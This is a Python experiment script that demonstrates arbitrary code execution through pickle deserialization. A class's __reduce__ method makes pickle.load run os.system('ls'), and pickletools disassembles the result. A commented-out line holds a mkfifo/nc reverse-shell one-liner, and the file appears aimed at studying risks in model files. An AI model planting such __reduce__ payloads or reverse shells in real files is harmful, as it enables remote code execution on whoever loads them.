import pickletools
import pickle

# def hackit():
#     print("hacked")
#     import os
#     os.system("ls")

# https://github.com/python/cpython/blob/3.12/Lib/pickle.py#L1578
def _getattribute(obj, name):
    for subpath in name.split('.'):
        if subpath == '<locals>':
            raise AttributeError("Can't get local attribute {!r} on {!r}"
                                 .format(name, obj))
        try:
            parent = obj
            obj = getattr(obj, subpath)
        except AttributeError:
            raise AttributeError("Can't get attribute {!r} on {!r}"
                                 .format(name, obj)) from None
    return obj, parent

def whichmodule(obj, name=None):
    """Find the module an object belong to."""
    if name is None:
        name = getattr(obj, '__qualname__', None)
    if name is None:
        name = obj.__name__
    module_name = getattr(obj, '__module__', None)
    if module_name is not None:
        return module_name
    # Protect the iteration by using a list copy of sys.modules against dynamic
    # modules that trigger imports of other modules upon calls to getattr.
    for module_name, module in sys.modules.copy().items():
        if (module_name == '__main__'
            or module_name == '__mp_main__'  # bpo-42406
            or module is None):
            continue
        try:
            if _getattribute(module, name)[0] is obj:
                return module_name
        except AttributeError:
            pass
    return '__main__'

class example_class:
    def __init__(self):
        self.a_number = 35
    
    # https://github.com/python/cpython/blob/3.12/Lib/pickletools.py#L1968-L1974
    # Called by REDUCE op.
    def __reduce__(self):
        # cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
        #        '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        import os
        #return eval("os.system"), ("ls",)
        return eval("os.system"), ("ls", )
        #return __import__('os').system, ("ls", )
        #return hackit, ()
    
    def __getstate__(self):
        print("I'm being pickled")
        self.a_number *= 2
        return self.__dict__

    def __setstate__(self, d):
        self.__dict__ = d
    # https://github.com/python/cpython/blob/3.12/Lib/pickletools.py#L1968-L1974
    # def __setstate__(self, v):
    #     self.a_number = 35
    #     hackit()
    # a_string = "hey"
    # a_list = [1, 2, 3]
    # a_dict = {"first": "a", "second": 2, "third": [1, 2, 3]}
    # a_tuple = (22, 23)

# print("create object")
m = example_class()
# # print(m.a_number)
# # #m = [1,2]
# # #m = {"first": "a", "second": {2: "2", 3: "3"}}

# # Create some pickle
with open("ls.pkl", "wb") as f:
    pickle.dump(m, f)  # Pickling the object
    #pickle.dump([1,2,3], f)
# import sys
# print(whichmodule(sys))

with open("ls.pkl", "rb") as f:
    md = pickle.load(f)
    print(f"m:\n{md}\n")# Disassemmble it
#     print("disassemble")

# wget https://huggingface.co/farleyknight/mnist-digit-classification-2022-09-04/resolve/main/pytorch_model.bin
# wget https://huggingface.co/farleyknight/mnist-digit-classification-2022-09-04/resolve/main/training_args.bin
with open("ls.pkl", "rb") as f:
    md=f.read()
    print(md)
    pickletools.dis(md, annotate=1, indentlevel=0)

print("loading object")
# m2 = pickle.loads(md)
# print(m2)
# md2 = pickle.dumps(m2)  # Pickling the object
# print(f"m2:\n{md2}\n")

# # Disassemmble it
# print("disassemble")
# pickletools.dis(md2, annotate=1)

# print("it")
# for opcode, arg, pos in pickletools.genops(md):
#     print(opcode.name, arg, pos)